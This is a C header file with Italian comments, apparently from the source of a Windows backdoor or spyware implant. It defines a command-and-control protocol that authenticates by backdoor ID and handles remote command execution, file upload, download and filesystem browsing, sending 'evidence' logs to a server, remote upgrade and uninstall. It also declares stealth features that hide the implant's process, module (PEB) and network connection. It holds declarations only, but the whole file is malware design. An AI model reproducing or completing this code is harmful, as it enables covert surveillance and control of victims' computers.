// Struttura di un elemento per il filesystem browsing
typedef struct {
	DWORD depth;
	WCHAR *start_dir;
} fs_browse_elem;

// Funzioni esportate
BOOL ASP_Start(char *, char *);
void ASP_Stop(void);
void ASP_Bye(void);
BOOL ASP_Auth(char *, BYTE *, char *, BYTE *, DWORD *);
BOOL ASP_Id(WCHAR *, WCHAR *, long long *, DWORD *, DWORD);
BOOL ASP_GetUpload(BOOL, WCHAR *, DWORD, DWORD *);
BOOL ASP_GetDownload(DWORD *, WCHAR ***);
BOOL ASP_SendLog(char *, DWORD);
BOOL ASP_ReceiveConf(char *);
BOOL ASP_GetFileSystem(DWORD *, fs_browse_elem **);
BOOL ASP_GetCommands(DWORD *, WCHAR ***);
BOOL ASP_SendStatus(DWORD log_count, UINT64 log_size);
BOOL ASP_HandlePurge(long long *purge_time, DWORD *purge_size);

// Valori di ritorno della funzione ASP_Poll()
#define ASP_POLL_FETCHING 0
#define ASP_POLL_DONE 1
#define ASP_POLL_ERROR 2

// Comandi del protocollo
#define INVALID_COMMAND         (UINT)0x0       // Non usare
#define PROTO_OK                (UINT)0x1       // OK
#define PROTO_NO                (UINT)0x2       // Richiesta senza risposta
#define PROTO_BYE               (UINT)0x3       // Chiusura di connessione
#define PROTO_CHALLENGE         (UINT)0x4       // Autenticazione
#define PROTO_ID                (UINT)0xf       // Identificazione    
#define PROTO_NEW_CONF          (UINT)0x7       // Nuova configurazione
#define PROTO_UNINSTALL         (UINT)0xa       // Disinstallazione
#define PROTO_DOWNLOAD          (UINT)0xc       // DOWNLOAD, restituisce la lista dei nomi(in WCHAR, NULL terminati)
#define PROTO_UPLOAD            (UINT)0xd       // UPLOAD, restituisce la lista di coppie: nome,directory.
#define PROTO_LOG               (UINT)0x09      // Spedisce un evidence
#define PROTO_UPGRADE           (UINT)0x16      // Riceve un upgrade
#define PROTO_FILESYSTEM        (UINT)0x19      // Riceve le richieste relative al filesystem
#define PROTO_LOGSTATUS         (UINT)0x0b      // Invia il numero e la size dei log da spedire
#define PROTO_PURGE				(UINT)0x1a		// Elimina i file di log vecchi o troppo grossi
#define PROTO_COMMANDS			(UINT)0x1b		// Esecuzione diretta di comandi

// Strutture inviate o ritornate via IPC al core
typedef struct {
	DWORD server_addr;
	DWORD server_port;
} ASP_REPLY_SETUP;

typedef struct {
	DWORD upload_left;
	WCHAR file_name[MAX_PATH];
} ASP_REPLY_UPLOAD;

typedef struct {
	char backdoor_id[32];
	BYTE instance_id[20];
	char subtype[16];
	BYTE conf_key[16];
} ASP_REQUEST_AUTH;

typedef struct {
	WCHAR username[80];
	WCHAR device[80];
} ASP_REQUEST_ID;

typedef struct {
	WCHAR file_name[MAX_PATH];
	DWORD byte_per_second;
} ASP_REQUEST_LOG;

#pragma pack(4)
typedef struct {
	DWORD log_count;
	UINT64 log_size;
} ASP_REQUEST_STAT;

typedef struct {
	long long purge_time;
	DWORD purge_size;
} ASP_REPLY_PURGE;
#pragma pack()

typedef struct {
	WCHAR conf_path[MAX_PATH];
} ASP_REQUEST_CONF;

#define ASP_SLEEP_TIME 20
#define ASP_START_TIMEOUT 60000 // un minuto di attesa per far inizializzare il processo host ASP
#define ASP_CONNECT_TIMEOUT 10000 // timeout prima di determinare che il server non e' raggiungibile
#define ASP_RESOLVE_TIMEOUT 10000
#define ASP_SEND_TIMEOUT 600000
#define ASP_RECV_TIMEOUT 600000

#define WIRESPEED (100*1024*1024/8)

// --- Altri prototipi usati dal thread ASP ---
typedef void (WINAPI* ASP_MainLoop_t) (char*);
typedef void (WINAPI* ExitProcess_T) (UINT);
extern void HidePEB(HMODULE);

#define HOSTNAMELEN 256
typedef struct {
	HMCommonDataStruct pCommon;     // Necessario per usare HM_sCreateHookA. Definisce anche le funzioni come LoadLibrary
	char cDLLHookName[DLLNAMELEN];	// Nome della dll principale ("H4.DLL")
	char cASPServer[HOSTNAMELEN];   // server ASP
	char cASPMainLoop[64];          // Nome della funzione ASP
	ExitProcess_T pExitProcess;
} ASP_THREAD;


// Struttura per il passaggio dei comandi ASP in shared memory
#define ASP_SETUP 0   // Setup (primo comando da inviare) 
#define ASP_AUTH  1   // Auth 
#define ASP_IDBCK 2   // ID
#define ASP_AVAIL 3   // Lista availables
#define ASP_NCONF 4   // Nuova configurazione
#define ASP_UPLO  5   // Prende un upload
#define ASP_DOWN  6   // Prende le richieste di download
#define ASP_FSYS  7   // Prende le richieste di filesystem browse
#define ASP_SLOG  8   // Invia un log al server
#define ASP_UPGR  9   // Prende un upgrade
#define ASP_BYE   10  // Chiude la sessione
#define ASP_SSTAT 11  // Invia info sui log che sta per spedire
#define ASP_PURGE 12  // Riceve i dati per il purge dei log
#define ASP_CMDE  13  // Prende le richieste di command execution

// XXXXX da definire....
#define MAX_ASP_IN_PARAM 1024
#define MAX_ASP_OUT_PARAM 1024*1024

#define ASP_NOP   0 // Nessuna operazione da eseguire
#define ASP_FETCH 1 // ASP host deve eseguire l'action
#define ASP_DONE  2 // ASP host ha finito con successo
#define ASP_ERROR 3 // ASP host ha finito con un errore

typedef struct {
	struct {
		WORD action; // Azione da eseguire 
		WORD status; // stato dell'operazione (va settato per ultimo)
	} ctrl;
	DWORD out_command; // valore di ritorno del comando sul server
	BYTE in_param[MAX_ASP_IN_PARAM];
	DWORD in_param_len;
	BYTE out_param[MAX_ASP_OUT_PARAM];  // output del comando sul server
	DWORD out_param_len;
} ASP_IPC_CTRL;

extern HANDLE ASP_HostProcess; // Processo che gestisce ASP
extern ASP_IPC_CTRL* ASP_IPC_command;  // Area di shared memory per dare comandi al processo ASP
extern HANDLE hASP_CmdFile;                  // File handle della shared memory dei comandi
extern CONNECTION_HIDE connection_hide; // struttura per memorizzare il pid da nascondere
extern PID_HIDE pid_hide; // struttura per memorizzare la connessione da nascondere
extern HINTERNET asp_global_request;

BOOL ASP_StartASPThread(DWORD dwPid, ASP_THREAD* asp_thread);

WCHAR* UnPascalizeString(BYTE* data, DWORD* retlen);
BYTE* PascalizeString(WCHAR* string, DWORD* retlen);
